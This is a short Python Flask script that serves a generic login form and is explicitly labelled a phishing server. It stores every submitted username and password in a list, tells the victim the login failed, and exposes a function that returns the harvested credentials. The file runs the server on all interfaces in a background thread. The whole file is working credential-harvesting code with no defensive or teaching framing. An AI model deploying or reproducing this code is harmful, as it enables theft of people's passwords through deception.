from flask import Flask, request, render_template_string
import threading

app = Flask(__name__)
credentials = []

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <h2>Login</h2>
  <form method="POST">
    Username: <input name="username" type="text"><br>
    Password: <input name="password" type="password"><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        credentials.append((request.form["username"], request.form["password"]))
        return "<h3>Login failed. Try again.</h3>"
    return render_template_string(LOGIN_HTML)

def run_server():
    app.run(host="0.0.0.0", port=5000)

def start_phishing_server():
    thread = threading.Thread(target=run_server)
    thread.daemon = True
    thread.start()

def get_credentials():
    return credentials
